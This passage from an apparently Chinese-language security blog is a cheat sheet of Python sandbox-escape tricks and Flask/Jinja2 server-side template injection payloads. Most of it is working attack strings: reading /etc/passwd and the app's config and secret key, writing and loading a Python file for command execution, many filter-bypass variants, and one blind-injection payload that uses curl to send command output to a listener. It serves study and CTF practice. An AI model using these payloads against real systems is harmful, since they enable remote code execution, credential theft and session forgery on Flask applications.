<h2 id="0x02-花式执行函数"><a href="#0x02-花式执行函数" class="headerlink" title="0x02 花式执行函数"></a>0x02 花式执行函数</h2><p>通过上面内容我们很容易发现，光引入 os 只不过是第一步，如果把 system 这个函数干掉，也没法通过<code>os.system</code>执行系统命令，并且这里的<code>system</code>也不是字符串，也没法直接做编码等等操作。我遇到过一个环境，直接在<code>/usr/lib/python2.7/os.py</code>中删了<code>system</code>函数。。。</p>
<p>不过，要明确的是，os 中能够执行系统命令的函数有很多：</p>
<div class="hljs code-wrapper"><pre><code class="hljs lua"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.system(<span class="hljs-string">&#x27;whoami&#x27;</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) 
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.popen2(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) # <span class="hljs-number">2.</span>x
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.popen3(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) # <span class="hljs-number">2.</span>x
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.popen4(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) # <span class="hljs-number">2.</span>x
...</code></pre></div>

<p>应该还有一些，可以在这里找找：</p>
<p><a target="_blank" rel="noopener" href="https://docs.python.org/2/library/os.html">2.x 传送门</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.python.org/3/library/os.html">3.x 传送门</a></p>
<p>过滤<code>system</code>的时候说不定还有其他函数给漏了。</p>
<p>其次，可以通过 <code>getattr</code> 拿到对象的方法、属性：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os
<span class="hljs-built_in">getattr</span>(os, <span class="hljs-string">&#x27;metsys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)</code></pre></div>

<p>不让出现 import也没事：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(__builtins__, <span class="hljs-string">&#x27;__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]), <span class="hljs-string">&#x27;metsys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)
macr0phag3
<span class="hljs-number">0</span></code></pre></div>

<p>一样可以。这个方法同样可以用于逃逸过滤 import 的沙箱。关于 <code>__builtins__</code>，见下文。</p>
<p>与 <code>getattr</code> 相似的还有 <code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是<code>getattr</code>相当于<code>class.attr</code>，都是获取类属性/方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code>，还找不到则报错。更具体的这里就不解释了，有兴趣的话可以搜搜。</p>
<h2 id="0x03-删除了-builtins-中的函数"><a href="#0x03-删除了-builtins-中的函数" class="headerlink" title="0x03 删除了__builtins__中的函数"></a>0x03 删除了<code>__builtins__</code>中的函数</h2><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> targets:
    <span class="hljs-keyword">del</span> __builtins__.__dict__[x]</code></pre></div>



<p>可以通过reload重新导入<code>__builtins__</code>模块<code>reload(__builtin__)</code></p>
<p>reload也是<code>__builtins__</code>中的一个函数，假如它也被删了的话，还可以尝试一个imp的模块</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> imp
imp.reload(__builtin__)</code></pre></div>



<h2 id="0x04-修改了sys-modules"><a href="#0x04-修改了sys-modules" class="headerlink" title="0x04 修改了sys.modules"></a>0x04 修改了sys.modules</h2><p>由于import导入包时，是从sys.path中去导入对应的包<br>防御者可能会对其进行修改，导致无法导入想要的模块</p>
<p>这时可以自己尝试修改模块的位置<code>sys.modules[&#39;os&#39;]=&#39;/usr/lib/python2.7/os.py&#39;</code><br>或者尝试运行一遍<code>os.py</code>，也就相当于导入了一次os模块</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">execfile(<span class="hljs-string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</code></pre></div>



<h2 id="0x05-base64编码"><a href="#0x05-base64编码" class="headerlink" title="0x05 base64编码"></a>0x05 base64编码</h2><p>对关键字进行base64编码可绕过一些明文检测机制：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> base64
<span class="hljs-meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="hljs-string">&#x27;__import__&#x27;</span>)
<span class="hljs-string">&#x27;X19pbXBvcnRfXw==&#x27;</span>
<span class="hljs-meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="hljs-string">&#x27;os&#x27;</span>)
<span class="hljs-string">&#x27;b3M=&#x27;</span>
<span class="hljs-meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="hljs-string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)](<span class="hljs-string">&#x27;b3M=&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)).system(<span class="hljs-string">&#x27;calc&#x27;</span>)
<span class="hljs-number">0</span></code></pre></div>




<h1 id="flask-SSTI"><a href="#flask-SSTI" class="headerlink" title="flask SSTI"></a>flask SSTI</h1><p>flask的ssti的利用方式与沙箱逃逸有所不同，一方面是无法直接写入python代码，但是利用<strong>继承关系</strong>那一套依旧适用，另一方面，<strong>模板语法</strong>以及flask框架所引入的类也是可以进行利用的。</p>
<p>常见考点<strong>为读配置</strong>和进行<strong>代码执行</strong>。</p>
<h2 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h2><h3 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h3><p>Flask是一个使用Python编写的轻量级Web应用框架。其 WSGI 工具箱采用Werkzeug，模板引擎则使用Jinja2。</p>
<h3 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h3><p>Jinja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。</p>
<p>在Jinja2中，存在三种语句：</p>
<div class="hljs code-wrapper"><pre><code class="hljs crystal">控制结构 <span class="hljs-template-variable">&#123;% %&#125;</span>
变量取值 <span class="hljs-template-variable">&#123;&#123; &#125;&#125;</span>
注释 &#123;<span class="hljs-comment"># #&#125;</span></code></pre></div>

<p>Jinja2模板中使用上述第二种的语法表示一个变量，它是一种特殊的占位符。当利用Jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，Jinja2支持Python中所有的Python数据类型比如列表、字段、对象等。被两个括号包裹的内容会输出其表达式的值。</p>
<p>Jinja2中的过滤器可以理解为是Jinja2里面的内置函数和字符串处理函数。</p>
<h3 id="模板渲染函数"><a href="#模板渲染函数" class="headerlink" title="模板渲染函数"></a>模板渲染函数</h3><h4 id="render-template"><a href="#render-template" class="headerlink" title="render_template()"></a>render_template()</h4><p>使用render_template()方法可以渲染模板，你只要提供模板名称和需要作为参数传递给模板的变量就行了。</p>
<p>渲染过程如下，render_template()函数的第一个参数为渲染的目标html页面、第二个参数为需要加载到页面指定标签位置的内容，来自网上摘的一个图：</p>
<p><img src="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E6%9E%90Python-Flask-SSTI/1.png" alt="img"></p>
<p>其实render_template()的功能是先引入home.html，同时根据后面传入的参数，对html进行修改渲染。</p>
<p>注意：当在HTML模板中在标签内传入的内容是通过如``而非%s这种传参形式时，HTML自动转义默认开启。因此，如果 name 包含 HTML ，那么会被自动转义。</p>
<h2 id="0x02-上下文和全局变量"><a href="#0x02-上下文和全局变量" class="headerlink" title="0x02 上下文和全局变量"></a>0x02 上下文和全局变量</h2><p>默认情况下，Jinja2模板中提供以下全局变量：</p>
<ul>
<li><code>config</code>，当前配置对象</li>
<li><code>request</code>，当前请求对象</li>
<li><code>session</code>，当前会话对象</li>
<li><code>g</code>，全局变量的请求绑定对象。开发人员通常使用它在请求期间存储资源。</li>
<li>get_flashed_messages</li>
<li>url_for</li>
<li>application</li>
</ul>
<p>如果要详细了解它们的全局变量，请访问以下API文档链接：<a target="_blank" rel="noopener" href="http://flask.pocoo.org/docs/1.0/templating/#standard-context">Flask</a>和<a target="_blank" rel="noopener" href="http://jinja.pocoo.org/docs/dev/templates/#builtin-globals">Jinja</a>。</p>
<h2 id="0x03-敏感信息泄露"><a href="#0x03-敏感信息泄露" class="headerlink" title="0x03 敏感信息泄露"></a>0x03 敏感信息泄露</h2><p>访问对应的全局变量即可直接泄露出配置文件的内容。</p>
<h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>比如config变量：</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/7.png" alt="img"></p>
<p>某些情况下，当获取secret_key后，即可对session进行重新签名，完成session的伪造。</p>
<p>注意：Flask的session是保存在客户端，称为客户端session，会进行编码和校验。</p>
<p>整合一下可利用的PoC技巧：</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">?name&#x3D;&#123;&#123;config&#125;&#125;
?name&#x3D;&#123;&#123;person.secret&#125;&#125;
?name&#x3D;&#123;&#123;self.__dict__&#125;&#125;
?name&#x3D;&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;
?name&#x3D;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</code></pre></div>









<h2 id="0x04-读写文件"><a href="#0x04-读写文件" class="headerlink" title="0x04 读写文件"></a>0x04 读写文件</h2><p>这里需要用到Python沙箱逃逸的元素链，这里直接给出payload，具体构造过程可参考<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/">《Python沙箱逃逸小结》</a>。</p>
<p><strong>读文件</strong></p>
<p>这里只给个演示的poc，其他绕过类的poc参考<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/">《Python沙箱逃逸小结》</a>构造即可：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Python2</span>
?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;E:/passwd&#x27;).read()&#125;&#125;
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()

<span class="hljs-comment"># Python3中无file，只能用open</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()</code></pre></div>





<h2 id="0x05-代码执行"><a href="#0x05-代码执行" class="headerlink" title="0x05 代码执行"></a>0x05 代码执行</h2><h3 id="利用from-pyfile加载对象到Flask配置环境"><a href="#利用from-pyfile加载对象到Flask配置环境" class="headerlink" title="利用from_pyfile加载对象到Flask配置环境"></a>利用from_pyfile加载对象到Flask配置环境</h3><p>这种利用方式算是一种简单的漏洞组合拳。</p>
<p>先利用文件写入漏洞写一个Python文件：</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;E:&#x2F;m7.py&#39;,&#39;w&#39;).write(&#39;from subprocess import check_output\nRUNCMD&#x3D;check_output\n&#39;)&#125;&#125;</code></pre></div>

<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/11.png" alt="img"></p>
<p>然后使用config.from_pyfile将该Python文件加载到config变量中：</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">?name&#x3D;&#123;&#123;config.from_pyfile(&#39;E:&#x2F;m7.py&#39;)&#125;&#125;</code></pre></div>

<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/12.png" alt="img"></p>
<p>访问全局变量config查看是否加载成功：</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/13.png" alt="img"></p>
<p>加载成功后，就可以通过以下形式执行任意命令了：</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">?name&#x3D;&#123;&#123;config[&#39;RUNCMD&#39;](&#39;whoami&#39;)&#125;&#125;</code></pre></div>

<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/14.png" alt="img"></p>
<p>可知，这种利用方式是直接有回显的。</p>
<h3 id="利用元素链中可利用的命令执行函数"><a href="#利用元素链中可利用的命令执行函数" class="headerlink" title="利用元素链中可利用的命令执行函数"></a>利用元素链中可利用的命令执行函数</h3><p>元素链的payload就很多，具体看<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/">《Python沙箱逃逸小结》</a>来进行各种payload的构造就好，这里只给出几个简单的示例：</p>
<p>os.system()的利用是无回显的：</p>
<div class="hljs code-wrapper"><pre><code class="hljs handlebars"><span class="xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(<span class="hljs-name">&#x27;calc&#x27;</span>)&#125;&#125;</span></code></pre></div>

<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/15.png" alt="img"></p>
<p>要想有回显，可利用如下几个：</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2"># os.popen(cmd).read()
?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].popen(&#39;whoami&#39;).read()&#125;&#125;

# platform.popen(cmd).read()
?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;platform&#39;).popen(&#39;whoami&#39;).read()&#125;&#125;

# sys.modules间接调用前面两个模块
?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;sys&#39;).modules[&#39;os&#39;].popen(&#39;whoami&#39;).read()&#125;&#125;
?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;sys&#39;).modules[&#39;platform&#39;].popen(&#39;whoami&#39;).read()&#125;&#125;
</code></pre></div>







<p><strong>也可利用jinja2中特有的全局变量request等。</strong></p>
<p>在大多数示例中，我们用来<code>request.args</code>访问GET参数，但是可以使用自定义值填充其他字典：</p>
<ul>
<li>GET： <code>request.args</code></li>
<li>Cookie： <code>request.cookies</code></li>
<li>headers： <code>request.headers</code></li>
<li>environ： <code>request.environ</code></li>
<li>POST： <code>request.values</code></li>
</ul>
<p>以下符号可用于访问对象的属性：</p>
<ul>
<li><code>request.__class__</code></li>
<li><code>request[&quot;__class__&quot;]</code></li>
<li><code>request|attr(&quot;__class__&quot;)</code></li>
</ul>
<p>数组元素可以通过以下方式访问：</p>
<ul>
<li><code>array[0]</code></li>
<li><code>array.pop(0)</code></li>
</ul>
<h2 id="0x06-利用request类"><a href="#0x06-利用request类" class="headerlink" title="0x06 利用request类"></a><strong>0x06 利用request类</strong></h2><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#125;&#125;</code></pre></div>



<p>本地环境遇到字符串就直接gg，可能是jinja2不支持直接使用引号的字符串。</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">192.168.133.180:5000&#x2F;?exploit&#x3D;&#123;&#123;request.application.__globals__.__builtins__.__import__(request.args.x1).popen(request.args.x2).read()&#125;&#125;&amp;x1&#x3D;os&amp;x2&#x3D;whoami</code></pre></div>



<h1 id="flask-SSTI绕过方法"><a href="#flask-SSTI绕过方法" class="headerlink" title="flask SSTI绕过方法"></a><strong>flask SSTI绕过方法</strong></h1><h2 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了[]"></a>过滤了<code>[]</code></h2><ul>
<li><strong>调用<code>__getitem__()</code>函数直接替换；</strong></li>
<li>调用pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；</li>
</ul>
<p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>).__subclasses__().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()</code></pre></div>

<p>在这里使用 pop 函数并不会真的移除，但却能返回其值，取代中括号来实现绕过。</p>
<p>如：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 原型</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)

<span class="hljs-comment"># __getitem__()替换中括号[]</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>).__subclasses__().__getitem__(<span class="hljs-number">59</span>).__init__.__globals__.__getitem__(<span class="hljs-string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="hljs-string">&#x27;__import__&#x27;</span>)(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)

<span class="hljs-comment"># pop()替换中括号[]，结合__getitem__()利用</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>).__subclasses__().pop(<span class="hljs-number">59</span>).__init__.__globals__.pop(<span class="hljs-string">&#x27;__builtins__&#x27;</span>).pop(<span class="hljs-string">&#x27;__import__&#x27;</span>)(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div>







<h2 id="过滤了-或者-（利用request）"><a href="#过滤了-或者-（利用request）" class="headerlink" title="过滤了.或者[]（利用request）"></a>过滤了<code>.</code>或者<code>[]</code><strong>（利用request）</strong></h2><p>若.也被过滤，使用原生 JinJa2 函数 |attr()</p>
<p>即将 <code>request.__class__ </code>改成<code> request|attr(&quot;__class__&quot;)</code> </p>
<p>过滤了<code>.</code>可以使用字典的方式</p>
<p>比如：</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#125;&#125;</code></pre></div>



<p>换成</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5f&#39;][&#39;\x5f\x5fbuiltins\x5f\x5f&#39;][&#39;\x5f\x5fimport\x5f\x5f&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;id&#39;)[&#39;read&#39;]()&#125;&#125;</code></pre></div>





<h2 id="过滤下划线-（利用request）"><a href="#过滤下划线-（利用request）" class="headerlink" title="过滤下划线 _（利用request）"></a>过滤下划线 _<strong>（利用request）</strong></h2><p>flask中</p>
<p><strong>利用 request.args 的属性</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs python">&#123;&#123; &#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre></div>

<p>将其中的 request.args 改为 request.values，则利用 post 的方式进行传参。</p>
<p>GET:</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">&#123;&#123; <span class="hljs-string">&#x27;&#x27;</span>[request.value.<span class="hljs-keyword">class</span>][request.value.mro][<span class="hljs-number">2</span>][request.value.subclasses]()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;</code></pre></div>

<p>POST:</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre></div>



<p><strong>也可以利用十六进制</strong></p>
<p>更为简便</p>
<p>原payload</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#125;&#125;</code></pre></div>



<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5f&#39;][&#39;\x5f\x5fbuiltins\x5f\x5f&#39;][&#39;\x5f\x5fimport\x5f\x5f&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;id&#39;)[&#39;read&#39;]()&#125;&#125;</code></pre></div>



<h2 id="同时过滤了-和request-request以及-利用-join"><a href="#同时过滤了-和request-request以及-利用-join" class="headerlink" title="同时过滤了.和request[request以及_(利用|join)"></a>同时过滤了<code>.</code>和<code>request[request</code>以及<code>_</code><strong>(利用<code>|join</code>)</strong></h2><p>当上述三种都被过滤了，下面这种payload就失效了</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;192.168.133.180:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr(request.args.param&#125;&#125;&amp;param&#x3D;__class__</code></pre></div>



<p>我们需要找到可以走私<code>__class__</code>的方法，jinja2中的过滤器join可以满足要求</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_</code></pre></div>



<h2 id="过滤了-、-和request-request以及"><a href="#过滤了-、-和request-request以及" class="headerlink" title="过滤了[]、.和request[request以及_"></a>过滤了<code>[]</code>、<code>.</code>和<code>request[request</code>以及<code>_</code></h2><p>在上述的基础上，加入了<code>[]</code>，上述的payload就无法使用了，列表无法使用了，但是join支持元组</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_</code></pre></div>

<p>但是，它有点丑陋且很长。使用该<code>.getlist()</code>函数，我们可以将其缩短一点：</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr(request.args.getlist(request.args.l)|join)&#125;&#125;&amp;l&#x3D;a&amp;a&#x3D;_&amp;a&#x3D;_&amp;a&#x3D;class&amp;a&#x3D;_&amp;a&#x3D;_</code></pre></div>



<h2 id="过滤了-join（利用-format）"><a href="#过滤了-join（利用-format）" class="headerlink" title="过滤了|join（利用|format）"></a>过滤了<code>|join</code><strong>（利用<code>|format</code>）</strong></h2><p>上面的绕过都是基于join，如果其被过滤了，我们可以使用format</p>
<p>在相同的查询字符串paramters<code>&amp;a=_</code>我们可以形成一个格式字符串，将导致<code>__class__</code>：<code>%s%sclass%s%s</code><br>该<code>%s</code>标识符将与传递的字符串替换。我们的新攻击向量如下所示：</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f&#x3D;%s%sclass%s%s&amp;a&#x3D;_</code></pre></div>





<h2 id="过滤了引号-‘’（利用request）"><a href="#过滤了引号-‘’（利用request）" class="headerlink" title="过滤了引号 ‘’（利用request）"></a>过滤了引号 ‘’<strong>（利用request）</strong></h2><p>flask 中</p>
<p>request.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 当作变量名，将后面的路径传值进来，进而绕过了引号的过滤。</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">&#123;&#123;().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__().pop(<span class="hljs-number">40</span>)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd</code></pre></div>







<h2 id="过滤了花括号-123-125-盲注"><a href="#过滤了花括号-123-125-盲注" class="headerlink" title="过滤了花括号{&#123; &#125;}(盲注)"></a>过滤了花括号{&#123; &#125;}(盲注)</h2><div class="hljs code-wrapper"><pre><code class="hljs jinja2">#用&#123;%%&#125;标记
&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;127.0.0.1:7999&#x2F;?i&#x3D;&#96;whoami&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</code></pre></div>









<h2 id="过滤-globals"><a href="#过滤-globals" class="headerlink" title="过滤__globals__"></a>过滤<code>__globals__</code></h2><p>当<code>__globals__</code>被禁用时，</p>
<ul>
<li>可以用func_globals直接替换；</li>
<li>使用<code>__getattribute__(‘__globa’+’ls__‘)</code>；</li>
</ul>
<p>如：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 原型是调用__globals__</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)

<span class="hljs-comment"># 如果过滤了__globals__，可直接替换为func_globals</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)
<span class="hljs-comment"># 也可以通过拼接字符串得到方式绕过</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__getattribute__(<span class="hljs-string">&quot;__glo&quot;</span>+<span class="hljs-string">&quot;bals__&quot;</span>)[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div>





<h2 id="过滤-mro-或-bases-或-base"><a href="#过滤-mro-或-bases-或-base" class="headerlink" title="过滤__mro__或__bases__或__base__"></a>过滤<code>__mro__或__bases__或__base__</code></h2><p>两者可互相替换来Bypass其中之一被禁用的情况，但需要注意两者获取object类时的格式区别：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>]
[].__class__.__mro__[<span class="hljs-number">1</span>]
&#123;&#125;.__class__.__mro__[<span class="hljs-number">1</span>]
().__class__.__mro__[<span class="hljs-number">1</span>]
[].__class__.__mro__[-<span class="hljs-number">1</span>]
&#123;&#125;.__class__.__mro__[-<span class="hljs-number">1</span>]
().__class__.__mro__[-<span class="hljs-number">1</span>]
&#123;&#125;.__class__.__bases__[<span class="hljs-number">0</span>]
().__class__.__bases__[<span class="hljs-number">0</span>]
[].__class__.__bases__[<span class="hljs-number">0</span>]
[].__class__.__base__
().__class__.__base__
&#123;&#125;.__class__.__base__</code></pre></div>

<p>如：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 三者互换均可</span>
